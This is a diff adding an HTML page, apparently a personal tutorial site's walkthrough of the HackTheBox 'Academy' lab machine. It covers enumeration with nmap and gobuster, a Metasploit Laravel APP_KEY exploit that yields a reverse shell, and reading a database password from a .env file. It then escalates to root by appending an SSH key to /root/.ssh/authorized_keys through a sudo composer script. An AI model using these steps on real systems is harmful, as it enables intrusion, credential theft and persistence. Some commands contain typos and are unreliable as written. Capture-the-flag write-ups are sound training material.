@@ -1,0 +1,88 @@
+<!DOCTYPE html>
+<html>
+	<body>
+		<link rel="stylesheet" href="../../../css/menu.css">
+		<div class="topnav">
+			<a class="active" href="../../main/index.html">Home</a>
+			<a href="../../main/projects.html">GitHub Projects</a>
+			<a href="../../main/contact.html">Contact</a>
+			<a href="../../main/papers.html">Papers</a>
+		    <div class="dd1">
+		    <button class="dropbtn" onclick="myFunction()"> Tutorials
+		        <i class="Tutorials"></i>
+		    </button>
+		    <div class="dd1-content" id="Dropdown1">
+				<a href="../Windows/index.html">Windows</a>
+				<a href="../Linux/index.html">Linux</a>
+				<a href="../Server/index.html">Server</a>
+				<a href="../htb.html">HTB</a>
+				<a href="../DVWA.html">DVWA</a>
+		    </div>
+		    </div>
+		</div>
+<script>
+	function myFunction() {
+		document.getElementById("Dropdown1").classList.toggle("show");
+	}
+	
+	window.onclick = function(e) {
+		if (!e.target.matches('.dropbtn')) {
+		var myDropdown = document.getElementById("Dropdown1");
+		if (myDropdown.classList.contains('show')) {
+			myDropdown.classList.remove('show');
+		}
+		}
+	}
+</script>
+    <h1> <center>Hackthebox Academy</center></h1>
+    <h2>Steps</h2>
+    <ul>
+        <li>Run nmap</li>
+        <pre>
+            <code>nmap -p- -sC -sV 10.0.0.215 | tee Academy.nmap</code>
+        </pre>
+        <p>You'll see that port 22 and 80 are opened. You'll see it's trying to redirect you to Academy.htb. There is also port 33060 which belongs to mysql you could use.</p>
+        <li>Put Academy.htb in /etc/hosts</li>
+        <pre>
+            <code>
+                vi /etc/hosts
+                10.0.0.215 Academy.htb
+                :wq
+            </code>
+        </pre>
+        <li>run gobuster</li>
+        <pre>
+            <code>gobuster dir -w /usr/share/wordlists/dirb/commont.txt -u http://Academy.htb | tee Academy.gobuster</code>
+        </pre>
+        <li>start burpsuite</li>
+        <pre>
+            <p>Go to <b>proxy</b> and turn Intercept to on. Go back to the website, and type a username and password in there. Capture <br>the information and send it to the <b>repeater</b> section.</p>
+        </pre>
+        <li>attempt to register as admin</li>
+        <p>Once you login as admin, you'll see that it says there is a bug on dev-stagging-01.academy.htb. Add dev-stagging-01.academy.htb to /etc/hosts.put dev-stagging-01.academy.htb in the url and entering that site shows that it is built with laravel and an APP_KEY.</p>
+        <h4>Using Metasploit</h4>
+        <code>
+            <li class="tab2">msfconsole</li>
+            <li class="tab2">search laravel</li>
+            <li clss="tab2">set APP_KEY "key found on website"</li>
+            <li class="tab2">set rhost "hackthebox_Academy_IP"</li>
+            <li class="tab2">set vhost dev-staging-01.academy.htb</li>
+            <li class="tab2">set LHOST "IP.Address.from.hackthebox"</li>
+            <li class="tab2">run</li>
+        </code>
+        <p>We then get a shell. To get a normal terminal shell type the following command: bash -i</p>
+        <h4>in the shell</h4>
+        <li>cat the .env file in /var/www/html/academy. It shows the password <i>mySup3rP4s5w0rd</i> in DB_PASSWORD. This password is valid for cry0l1t3.</li>
+        <h4>SSH</h4>
+        <li>we then ssh into the box using the following command: <i>ssh cry0l1t3@HTBAcademyIP </i>. Then you enter the password found in the .env file</li>
+        <li>now cat user.txt</li>
+        <h4>root access</h4>
+        <li>cd into /var/log/audit, and then type this command: <i>cat * | grep 'comm="su"'</i>. There we find a data string which we can decrypt online. Once you find the password, you can use it on mrb3n user.</li>
+        <li>We then copy our ssh key into composer.json to get root</li>
+        <li>We then make a temporary directory by doing this <i>tmpdir=$(mktemp -d); vi $tmpdir/composer.json</i>. We then put <i>{“scripts” : {“SSH” : echo ‘SSH-KEYS’ >>/root/.ssh/authorized_keys}}</i> in the compose.json file.</li>
+        <li>We run the script by running this command: <i>sudo composer –working -dir=$tmpdir run -script SSH</i>. You now have root access.</li>
+
+    </ul>
+
+    </body>
+</html>
